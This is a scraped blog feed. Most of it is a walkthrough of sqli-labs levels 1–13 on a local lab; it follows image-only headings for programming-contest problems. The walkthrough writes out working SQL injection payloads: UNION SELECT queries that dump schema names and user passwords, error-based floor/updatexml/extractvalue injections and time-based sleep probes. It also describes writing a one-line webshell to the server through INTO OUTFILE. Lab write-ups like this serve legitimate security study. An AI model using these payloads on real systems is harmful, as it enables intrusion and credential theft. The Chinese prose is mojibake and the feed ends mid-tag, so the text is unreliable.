src="https://tva4.sinaimg.cn/large/007u7C9Rgy1ggi8oap28ij316g0ezjsv.jpg" alt=""><br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1ggi8oi0whzj30tv08574d.jpg" alt=""><br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1ggi8opqlp4j30ns0nuab9.jpg" alt=""></p><h2 id="é—°å¹´è®¡æ•°"><a href="#é—°å¹´è®¡æ•°" class="headerlink" title="é—°å¹´è®¡æ•°"></a>é—°å¹´è®¡æ•°</h2><p><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1ggi8ryagi2j314w0lrwia.jpg" alt=""><br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1ggi8s3d9k4j30uf0mxwfo.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1ggi8sc7xeoj30pk0ofabd.jpg" alt=""></p><h2 id="å°é›é¸Ÿçœ‹æ—¶é—´"><a href="#å°é›é¸Ÿçœ‹æ—¶é—´" class="headerlink" title="å°é›é¸Ÿçœ‹æ—¶é—´"></a>å°é›é¸Ÿçœ‹æ—¶é—´</h2><p><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1ggi8wcyzkoj313i0p7q7v.jpg" alt=""><br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1ggi8wjx7z8j30rq0ej74p.jpg" alt=""><br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1ggi8wrq4x8j30kx0hi0ts.jpg" alt=""></p><h2 id="å¤§ç™½çš„å­—ç¬¦ä¸²"><a href="#å¤§ç™½çš„å­—ç¬¦ä¸²" class="headerlink" title="å¤§ç™½çš„å­—ç¬¦ä¸²"></a>å¤§ç™½çš„å­—ç¬¦ä¸²</h2><p><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1ggi8yiig4fj30xt0owmyu.jpg" alt=""><br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1ggi8z3om6wj30w006zaa4.jpg" alt=""><br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1ggi8za0hntj30m20gp0tk.jpg" alt=""></p><h2 id="å°é›é¸ŸæŠ¥æ—¶"><a href="#å°é›é¸ŸæŠ¥æ—¶" class="headerlink" title="å°é›é¸ŸæŠ¥æ—¶"></a>å°é›é¸ŸæŠ¥æ—¶</h2><p><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1ggi92fm0w7j311w0n3djp.jpg" alt=""><br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1ggi92nga7nj30tt0d9wez.jpg" alt=""><br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1ggi92z3xe8j30y50neta8.jpg" alt=""><br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1ggi936oyzbj30w00p3jtd.jpg" alt=""></p><h2 id="å°é›é¸Ÿçš„éš¾é¢˜"><a href="#å°é›é¸Ÿçš„éš¾é¢˜" class="headerlink" title="å°é›é¸Ÿçš„éš¾é¢˜"></a>å°é›é¸Ÿçš„éš¾é¢˜</h2><p><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1ggi94mlw9cj310z0kpaci.jpg" alt=""><br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1ggi94utjhij30ki0mtt9q.jpg" alt=""></p><h2 id="å°é›é¸Ÿä¸å¤§ç¦"><a href="#å°é›é¸Ÿä¸å¤§ç¦" class="headerlink" title="å°é›é¸Ÿä¸å¤§ç¦"></a>å°é›é¸Ÿä¸å¤§ç¦</h2><p><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1ggi96bk7jaj30yl0jfju7.jpg" alt=""><br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1ggi96g9gilj30qj087dfw.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1ggi96qe69lj30ke0d30t5.jpg" alt=""></p><h2 id="ç‰›è½§ç³–"><a href="#ç‰›è½§ç³–" class="headerlink" title="ç‰›è½§ç³–"></a>ç‰›è½§ç³–</h2><p><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1ggi98twv83j310h0fnjsw.jpg" alt=""><br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1ggi996g00rj30ua0apdfy.jpg" alt=""><br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1ggi99c9g2fj30ld0e4wey.jpg" alt=""></p><h2 id="è§£å¯†"><a href="#è§£å¯†" class="headerlink" title="è§£å¯†"></a>è§£å¯†</h2><p><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1ggi9a5xi0nj30xh0m5jtd.jpg" alt=""><br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1ggi9bqzpirj30ix0f0jry.jpg" alt=""></p><h2 id="é©¬éæ•°"><a href="#é©¬éæ•°" class="headerlink" title="é©¬éæ•°"></a>é©¬éæ•°</h2><p><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1ggi9d2zjstj30xm0m7q59.jpg" alt=""><br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1ggi9dj3efcj30sa092mxa.jpg" alt=""><br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1ggi9dps5x2j30gl0ogdgv.jpg" alt=""></p><h2 id="å°é›é¸Ÿä»¬å‚èµ›ï¼"><a href="#å°é›é¸Ÿä»¬å‚èµ›ï¼" class="headerlink" title="å°é›é¸Ÿä»¬å‚èµ›ï¼"></a>å°é›é¸Ÿä»¬å‚èµ›ï¼</h2><p><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1ggi9f08ddlj30xh0m6gnw.jpg" alt=""><br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1ggi9fg1lqkj30rk09m74d.jpg" alt=""><br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1ggi9fnlbe0j30k40dpt94.jpg" alt=""></p><h2 id="å°é›é¸Ÿé•¿å¤§å•¦-6"><a href="#å°é›é¸Ÿé•¿å¤§å•¦-6" class="headerlink" title="å°é›é¸Ÿé•¿å¤§å•¦ 6"></a>å°é›é¸Ÿé•¿å¤§å•¦ 6</h2><p><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1ggia0yxsbuj30yo0nf40u.jpg" alt=""><br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1ggia1l1211j30in0biglx.jpg" alt=""></p><h2 id="å°é›é¸Ÿæ‰«é›·"><a href="#å°é›é¸Ÿæ‰«é›·" class="headerlink" title="å°é›é¸Ÿæ‰«é›·"></a>å°é›é¸Ÿæ‰«é›·</h2><p><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1ggiaa7wvgij30rr0o80v8.jpg" alt=""><br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1ggiaae2mqfj30nq0cj74f.jpg" alt=""><br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1ggiaaotcd8j30ku0plq4g.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CUMTOJ&quot;&gt;&lt;a href=&quot;#CUMTOJ&quot; class=&quot;headerlink&quot; title=&quot;CUMTOJ&quot;&gt;&lt;/a&gt;CUMTOJ&lt;/h1&gt;&lt;h2 id=&quot;è´¢åŠ¡ç®¡ç†&quot;&gt;&lt;a href=&quot;#è´¢åŠ¡ç®¡ç†&quot; class=&quot;headerlink&quot; title=&quot;è´¢
      
    
    </summary>
    
    
      <category term="acm" scheme="https://devildragons.github.io/categories/acm/"/>
    
    
      <category term="cumt" scheme="https://devildragons.github.io/tags/cumt/"/>
    
  </entry>
  
  <entry>
    <title>SQLæ³¨å…¥ä¹‹sqli-labså­¦ä¹ </title>
    <link href="https://devildragons.github.io/2020/07/06/sqli-labs/"/>
    <id>https://devildragons.github.io/2020/07/06/sqli-labs/</id>
    <published>2020-07-05T16:00:00.000Z</published>
    <updated>2020-07-15T13:32:28.221Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQLæ³¨å…¥ä¹‹sqli-labså­¦ä¹ "><a href="#SQLæ³¨å…¥ä¹‹sqli-labså­¦ä¹ " class="headerlink" title="SQLæ³¨å…¥ä¹‹sqli-labså­¦ä¹ "></a>SQLæ³¨å…¥ä¹‹sqli-labså­¦ä¹ </h1><h2 id="ç¬¬ä¸€å…³"><a href="#ç¬¬ä¸€å…³" class="headerlink" title="ç¬¬ä¸€å…³"></a>ç¬¬ä¸€å…³</h2><p><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1gghi1osyygj30yq0ij427.jpg" alt=""><br>ç»è¿‡è¯­å¥and 1=2æµ‹è¯•ï¼Œé¡µé¢è¿”å›æ­£å¸¸ï¼Œæ‰€ä»¥ä¸æ˜¯æ•°å€¼å‹æ³¨å…¥ã€‚<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1gghi4ka3dnj31cn0iydko.jpg" alt=""><br>åœ¨idåé¢åŠ ä¸Šâ€™ï¼Œé¡µé¢è¿”å›ä¸æ­£å¸¸ï¼Œæ‰€ä»¥å¯èƒ½å­˜åœ¨å•å¼•å·æ³¨å…¥ã€‚<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1gghi97nzf0j30xl0ixn0r.jpg" alt=""><br>ä½¿ç”¨â€“+å°†sqlåé¢çš„è¯­å¥æ³¨é‡Šæ‰å,é¡µé¢è¿”å›æ­£å¸¸ï¼Œè¯´æ˜å­˜åœ¨å•å¼•å·å­—ç¬¦å‹æ³¨å…¥ã€‚<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1gghjqn7hj4j30g502g0sq.jpg" alt=""><br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gghibvs8gqj30wn0iq0w1.jpg" alt=""><br>ä½¿ç”¨order byè¯­å¥åˆ¤æ–­è¯¥è¡¨ä¸­æœ‰å‡ åˆ—æ•°æ®ã€‚<br>order by 3é¡µé¢å›æ˜¾æ­£å¸¸ï¼Œorder by 4é¡µé¢å›æ˜¾ä¸æ­£å¸¸ï¼Œè¯´æ˜è¯¥è¡¨æœ‰3åˆ—æ•°æ®ã€‚<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1gghiggb6rjj30vs0j7422.jpg" alt=""><br>ä½†æ˜¯å‘ç°å¹¶æ²¡æœ‰æ˜¾ç¤ºä½ã€‚<br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gghihmbtz4j30v80iqgp4.jpg" alt=""><br>å°†id=1æ”¹ä¸ºæ•°æ®åº“ä¸å­˜åœ¨çš„å€¼ï¼Œå¦‚999ï¼Œé¡µé¢è¾“å‡º2å’Œ3ï¼Œè¯´æ˜æœ‰2ä¸ªæ˜¾ç¤ºä½ã€‚<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1gghinkdjqlj31dh0iyjwx.jpg" alt=""><br><a href="http://localhost/sqli-labs-master/Less-1/?id=999&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs-master/Less-1/?id=999&#39;</a> union select 1,(select group_concat(schema_name) from information_schema.schemata),3 â€“+<br>æŸ¥è¯¢æ•°æ®åº“åä¿¡æ¯ã€‚<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1gghis7sf3aj30wa0j7427.jpg" alt=""><br>æˆ–è€…<a href="http://localhost/sqli-labs-master/Less-1/?id=999&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs-master/Less-1/?id=999&#39;</a> union select 1,(select database()),3 â€“+ä¹Ÿèƒ½æŸ¥è¯¢æ•°æ®åº“ã€‚<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1gghivf70b4j319k0j3wjl.jpg" alt=""><br><a href="http://localhost/sqli-labs-master/Less-1/?id=999&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs-master/Less-1/?id=999&#39;</a> union select 1,(select database()),(select group_concat(table_name) from information_schema.tables where table_schema=â€securityâ€) â€“+æŸ¥è¯¢securityæ•°æ®åº“çš„è¡¨åã€‚<br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gghixbrqq8j319f0ilwjj.jpg" alt=""><br><a href="http://localhost/sqli-labs-master/Less-1/?id=999&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs-master/Less-1/?id=999&#39;</a> union select 1,(select database()),(select group_concat(column_name) from information_schema.columns where table_name=â€usersâ€) â€“+æŸ¥è¯¢usersè¡¨ä¸­çš„åˆ—åã€‚<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1gghj2ripx3j31ez0iyn2t.jpg" alt=""><br><a href="http://localhost/sqli-labs-master/Less-1/?id=999&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs-master/Less-1/?id=999&#39;</a> union select 1,(select database()),(select group_concat(password) from users) â€“+æŸ¥è¯¢passwordåˆ—åä¸­çš„ä¿¡æ¯ã€‚</p><h2 id="ç¬¬äºŒå…³"><a href="#ç¬¬äºŒå…³" class="headerlink" title="ç¬¬äºŒå…³"></a>ç¬¬äºŒå…³</h2><p><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1gghj7zhrilj30y40izafp.jpg" alt=""><br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1gghj8kkhzqj30we0it79l.jpg" alt=""><br>è¾“å…¥id=2-1é¡µé¢å‘ç”Ÿå˜åŒ–ï¼Œè¯´æ˜å­˜åœ¨æ•°å€¼å‹æ³¨å…¥ã€‚<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1gghjq0rhc9j30fn02oaa3.jpg" alt=""><br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gghjbxayfgj30w00iq43k.jpg" alt=""><br>order by 3é¡µé¢æ­£å¸¸ï¼Œorder by 4é¡µé¢ä¸æ­£å¸¸ï¼Œæ‰€ä»¥æœ‰3åˆ—æ•°æ®ã€‚<br>ç„¶åä½¿ç”¨è”åˆæŸ¥è¯¢è¿›è¡Œæ³¨å…¥ï¼Œå‚è€ƒç¬¬ä¸€å…³çš„æ³¨å…¥ã€‚</p><h2 id="ç¬¬ä¸‰å…³"><a href="#ç¬¬ä¸‰å…³" class="headerlink" title="ç¬¬ä¸‰å…³"></a>ç¬¬ä¸‰å…³</h2><p><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1gghjjc91m8j31aa0iy461.jpg" alt=""><br>è¾“å…¥?id=1â€™ â€“+é¡µé¢ä¸æ­£å¸¸ã€‚<br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gghjkga8q7j30w30ix0xz.jpg" alt=""><br>è¾“å…¥?id=1â€™) â€“+é¡µé¢æ­£å¸¸<br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gghjo5s64oj30il036gln.jpg" alt=""><br>æ­£å¦‚æ‰€æµ‹è¯•çš„æ˜¯ä»¥(â€˜â€™)æ–¹å¼é—­åˆå­—ç¬¦ä¸²ã€‚</p><h2 id="ç¬¬å››å…³"><a href="#ç¬¬å››å…³" class="headerlink" title="ç¬¬å››å…³"></a>ç¬¬å››å…³</h2><p><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1gghjtxl80xj30pf0isq6q.jpg" alt=""><br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1gghju98tqjj30vn0isdl3.jpg" alt=""><br>?id=1â€ â€“+ä¸æ­£å¸¸ï¼Œ?id=1â€) â€“+æ­£å¸¸ï¼Œè¯´æ˜æ˜¯ä»¥(â€œâ€)çš„é—­åˆæ–¹å¼ã€‚<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1gghk01x17yj30gj03t0st.jpg" alt=""><br>ç„¶åå‚è€ƒç¬¬ä¸€å…³è¿›è¡Œè”åˆè¯­å¥æ³¨å…¥ã€‚</p><h2 id="ç¬¬äº”å…³"><a href="#ç¬¬äº”å…³" class="headerlink" title="ç¬¬äº”å…³"></a>ç¬¬äº”å…³</h2><p><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1gghk2t5xgvj30v90ib0xn.jpg" alt=""><br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gghk3btzcbj30v10imn20.jpg" alt=""><br>æ²¡æœ‰æ˜¾ç¤ºä½ï¼Œä¸èƒ½ä½¿ç”¨è”åˆæ³¨å…¥ã€‚<br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gghk5gzbc1j31bt0irdnh.jpg" alt=""><br>ç”¨?id=1â€™å‡ºç°é”™è¯¯è¯­å¥ï¼Œæ‰€ä»¥æˆ‘ä»¬èƒ½ç”¨ä¸€ä¸ªæ–°çš„æ³¨å…¥æ–¹æ³•ï¼šæŠ¥é”™æ³¨å…¥ã€‚</p><p>(1). é€šè¿‡flooræŠ¥é”™<br>and (select 1 from (select count(<em>),concat((payload),floor (rand(0)</em>2))x from information_schema.tables group by x)a)<br>å…¶ä¸­payloadä¸ºä½ è¦æ’å…¥çš„SQLè¯­å¥<br>éœ€è¦æ³¨æ„çš„æ˜¯è¯¥è¯­å¥å°† è¾“å‡ºå­—ç¬¦é•¿åº¦é™åˆ¶ä¸º64ä¸ªå­—ç¬¦</p><p>(2). é€šè¿‡updatexmlæŠ¥é”™<br>and updatexml(1,payload,1)<br>åŒæ ·è¯¥è¯­å¥å¯¹è¾“å‡ºçš„å­—ç¬¦é•¿åº¦ä¹Ÿåšäº†é™åˆ¶ï¼Œå…¶æœ€é•¿è¾“å‡º32ä½<br>å¹¶ä¸”è¯¥è¯­å¥å¯¹payloadçš„åæ‚”ç±»å‹ä¹Ÿåšäº†é™åˆ¶ï¼Œåªæœ‰åœ¨payloadè¿”å›çš„ä¸æ˜¯xmlæ ¼å¼æ‰ä¼šç”Ÿæ•ˆã€‚</p><p>(3). é€šè¿‡ExtractValueæŠ¥é”™<br>and extractvalue(1, payload)<br>è¾“å‡ºå­—ç¬¦æœ‰é•¿åº¦é™åˆ¶ï¼Œæœ€é•¿32ä½ã€‚</p><p>payloadå³æˆ‘ä»¬è¦è¾“å…¥çš„sqlæŸ¥è¯¢è¯­å¥</p><p>è¿™é‡Œä½¿ç”¨flooræŠ¥é”™è¯­å¥è¿›è¡Œæ³¨å…¥<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1gghkud3zc8j31g00jxgtp.jpg" alt=""><br><a href="http://localhost/sqli-labs-master/Less-5/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs-master/Less-5/?id=1&#39;</a> and (select 1 from(select count(<em>),concat((select schema_name from information_schema.schemata limit 6,1),floor (rand(0)*2))x from information_schema.tables group by x)a)â€“+æŸ¥å‡ºæ•°æ®åº“securityã€‚<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1gghkwrbol6j31d60jh46i.jpg" alt=""><br><a href="http://localhost/sqli-labs-master/Less-5/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs-master/Less-5/?id=1&#39;</a> and (select 1 from(select count(</em>),concat((select table_name from information_schema.tables where table_schema=â€securityâ€ limit 3,1),floor (rand(0)<em>2))x from information_schema.tables group by x)a)â€“+æŸ¥å‡ºè¡¨åusersã€‚<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1gghkyo3x46j31d60jnwmh.jpg" alt=""><br><a href="http://localhost/sqli-labs-master/Less-5/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs-master/Less-5/?id=1&#39;</a> and (select 1 from(select count(</em>),concat((select column_name from information_schema.columns where table_name=â€usersâ€ limit 2,1),floor (rand(0)<em>2))x from information_schema.tables group by x)a)â€“+æŸ¥å‡ºåˆ—åpasswordã€‚<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1gghl0hfyq4j31bd0ieahr.jpg" alt=""><br><a href="http://localhost/sqli-labs-master/Less-5/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs-master/Less-5/?id=1&#39;</a> and (select 1 from(select count(</em>),concat((select password from users limit 0,1),floor (rand(0)*2))x from information_schema.tables group by x)a)â€“+æŸ¥å‡ºpasswordä¸­çš„ä¿¡æ¯ã€‚</p><h2 id="ç¬¬å…­å…³"><a href="#ç¬¬å…­å…³" class="headerlink" title="ç¬¬å…­å…³"></a>ç¬¬å…­å…³</h2><p><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1gghl42a639j31c50ixn4v.jpg" alt=""><br>ç”¨?id=1â€å‡ºç°é”™è¯¯è¯­å¥ï¼Œæ‰€ä»¥å‚è€ƒç¬¬äº”å…³çš„æŠ¥é”™æ³¨å…¥å¯¹è¯¥é¢˜è¿›è¡Œæ³¨å…¥ã€‚</p><h2 id="ç¬¬ä¸ƒå…³"><a href="#ç¬¬ä¸ƒå…³" class="headerlink" title="ç¬¬ä¸ƒå…³"></a>ç¬¬ä¸ƒå…³</h2><p>æ•°æ®åº“çš„fileæƒé™è§„å®šäº†æ•°æ®åº“ç”¨æˆ·æ˜¯å¦æœ‰æƒé™å‘æ“ä½œç³»ç»Ÿå†…å†™å…¥å’Œè¯»å–å·²å­˜åœ¨çš„æƒé™</p><p>into outfileå‘½ä»¤ä½¿ç”¨çš„ç¯å¢ƒï¼š</p><p>æˆ‘ä»¬å¿…é¡»çŸ¥é“ï¼ŒæœåŠ¡å™¨ä¸Šä¸€ä¸ªå¯ä»¥å†™å…¥æ–‡ä»¶çš„æ–‡ä»¶å¤¹çš„å®Œæ•´è·¯å¾„<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1ggin52oosej30uy0idq7q.jpg" alt=""><br>ä½¿ç”¨?id=1â€™))é¡µé¢è¿”å›æ­£å¸¸ï¼Œè¯´æ˜æ˜¯((â€˜â€™))æ–¹å¼é—­åˆå­—ç¬¦ä¸²ã€‚<br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1ggin6z21v4j30hq0380sr.jpg" alt=""><br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1ggin799df7j30xx0ivq8f.jpg" alt=""><br>æœ¬å…³å¡æç¤ºæˆ‘ä»¬ä½¿ç”¨fileæƒé™å‘æœåŠ¡å™¨å†™å…¥æ–‡ä»¶ï¼Œæ‰€ä»¥å°è¯•å†™å…¥æ•°æ®åˆ°è‡ªå®šä¹‰ç›®å½•ä¸‹ã€‚<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1ggin9imytdj30kx04oq36.jpg" alt=""><br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1ggin9pq1zkj30d904lmxa.jpg" alt=""></p><p>æ•°æ®å†™å…¥æˆåŠŸã€‚<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1ggina5l900j31560ilgsj.jpg" alt=""><br>äºæ˜¯å‘è‡ªå®šä¹‰çš„ç›®å½•ä¸‹å†™å…¥ä¸€å¥è¯æœ¨é©¬ã€‚<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1gginb8oerzj30nt0ixaas.jpg" alt=""><br>è®¿é—®å†™å…¥çš„æ–‡ä»¶ï¼Œä»è€Œä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ã€‚<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1gginc2ls8dj30r4062wf2.jpg" alt=""><br>ç”¨èœåˆ€æˆ–èšå‰‘è¿æ¥ã€‚</p><h2 id="ç¬¬å…«å…³"><a href="#ç¬¬å…«å…³" class="headerlink" title="ç¬¬å…«å…³"></a>ç¬¬å…«å…³</h2><p><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1gginkhpg66j310i0iw44b.jpg" alt=""><br>ä½¿ç”¨?id=1â€™ â€“+é¡µé¢æ¢å¤æ­£å¸¸ã€‚<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1gginlbll8bj31540j90zo.jpg" alt=""><br>å‚è€ƒç¬¬ä¸ƒå…³å°è¯•å†™å…¥æ•°æ®æˆåŠŸï¼Œç„¶åä¸Šä¼ æœ¨é©¬è¿æ¥ã€‚</p><h2 id="ç¬¬ä¹å…³"><a href="#ç¬¬ä¹å…³" class="headerlink" title="ç¬¬ä¹å…³"></a>ç¬¬ä¹å…³</h2><p>å‘ç°æ— è®ºè¾“å…¥ä»€ä¹ˆé¡µé¢éƒ½æ²¡æœ‰å˜åŒ–ã€‚<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1gginr5d6zrj30x00ittdy.jpg" alt=""><br>ä½¿ç”¨?id=1â€™ and sleep(5) â€“+é¡µé¢å‡ºç°æ˜æ˜¾å»¶è¿Ÿï¼Œè¯´æ˜æœ¬å…³å¡æ˜¯æ—¶é—´ç›²æ³¨ã€‚<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1gginz6wrbrj30uj0j8gqi.jpg" alt=""><br>é€šè¿‡é¡µé¢çš„å»¶è¿ŸçŒœå‡ºæ•°æ®åº“æ˜¯8ä¸ªå­—ç¬¦ã€‚<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1ggio1a1p8nj30vn0iuaf5.jpg" alt=""><br>é€ä¸ªå­—ç¬¦çŒœæµ‹å¾—åˆ°æ•°æ®åº“ä¸ºsecurityã€‚<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1ggio74gbfqj317h0ix106.jpg" alt=""><br>é€šè¿‡ç±»ä¼¼æ“ä½œçŒœå‡ºè¡¨åusersã€‚<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1ggio9ebof5j31840iwdne.jpg" alt=""><br>è¿›è€ŒçŒœå‡ºåˆ—åpasswordã€‚<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1ggioaxx2p8j311u0j1wkp.jpg" alt=""><br>è¿›è€ŒçŒœå‡ºpasswordä¸­çš„ä¿¡æ¯ã€‚</p><h2 id="ç¬¬åå…³"><a href="#ç¬¬åå…³" class="headerlink" title="ç¬¬åå…³"></a>ç¬¬åå…³</h2><p><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1ggiocjttaaj30xc0iijx0.jpg" alt=""><br>åŒæ ·æ˜¯æ—¶é—´ç›²æ³¨ï¼Œåªä¸è¿‡æ˜¯åŒå¼•å·æ³¨å…¥ã€‚æ³¨å…¥è¿‡ç¨‹å‚è€ƒç¬¬ä¹å…³ã€‚</p><h2 id="ç¬¬åä¸€å…³"><a href="#ç¬¬åä¸€å…³" class="headerlink" title="ç¬¬åä¸€å…³"></a>ç¬¬åä¸€å…³</h2><p>ä»ç¬¬åä¸€å…³å¼€å§‹ä½¿ç”¨postçš„æ–¹å¼æ¥æäº¤æ•°æ®<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1ggip4c5khbj30xl0kzq8z.jpg" alt=""><br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1ggip5js1jzj30wr0j6jwq.jpg" alt=""><br>ä½¿ç”¨ä¸‡èƒ½å¯†ç ä»¥åŠorder byæµ‹è¯•å‡ºæœ‰ä¸¤ä¸ªæ˜¾ç¤ºä½ã€‚<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1ggipazyhyzj30tt0jw0yh.jpg" alt=""><br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1ggipb8qjhqj30wu0lbq8z.jpg" alt=""><br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1ggipd4gz1qj30wv0kodlu.jpg" alt=""><br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1ggipdadtiqj312o0kywkv.jpg" alt=""><br>ç„¶åä½¿ç”¨è”åˆæ³¨å…¥ä¾æ¬¡æŸ¥å‡ºæ•°æ®åº“ï¼Œè¡¨åï¼Œåˆ—åï¼Œåˆ—ä¸­çš„ä¿¡æ¯ã€‚</p><h2 id="ç¬¬åäºŒå…³"><a href="#ç¬¬åäºŒå…³" class="headerlink" title="ç¬¬åäºŒå…³"></a>ç¬¬åäºŒå…³</h2><p><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1ggipks25inj30yy0lb0yu.jpg" alt=""><br>ç»è¿‡æµ‹è¯•å‘ç°æœ¬å…³æ˜¯(â€œâ€)çš„å­—ç¬¦é—­åˆæ–¹å¼ã€‚<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1ggipnv1ilej30xp053aac.jpg" alt=""><br>ç„¶åå‚è€ƒç¬¬åä¸€å…³å¯¹æœ¬å…³è¿›è¡Œè”åˆæ³¨å…¥ã€‚</p><h2 id="ç¬¬åä¸‰å…³"><a href="#ç¬¬åä¸‰å…³" class="headerlink" title="ç¬¬åä¸‰å…³"></a>ç¬¬åä¸‰å…³</h2><p><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1ggiq9hyia9j30zq0kqteq.jpg" alt=""><br>ç»è¿‡æµ‹è¯•å‘ç°æœ¬å…³æ˜¯ä»¥(â€˜â€™)å­—ç¬¦çš„é—­åˆæ–¹å¼ï¼Œä½†æ˜¯æœ¬é¢˜æ²¡æœ‰æ˜¾ç¤ºä½ï¼Œä½†æ˜¯ä¼šæœ‰æŠ¥é”™è¯­å¥ï¼Œæ‰€ä»¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥çš„æ–¹æ³•è¿›è¡Œæ³¨å…¥ã€‚<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1ggiqbo9b54j30yf0in0y6.jpg" alt=""><br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1ggiqbufe53j30zg0k4afk.jpg" alt=""><br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1ggiqc22xopj30zy0k20yd.jpg" alt=""><br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1ggiqc857zcj30yh0kmdld.jpg" 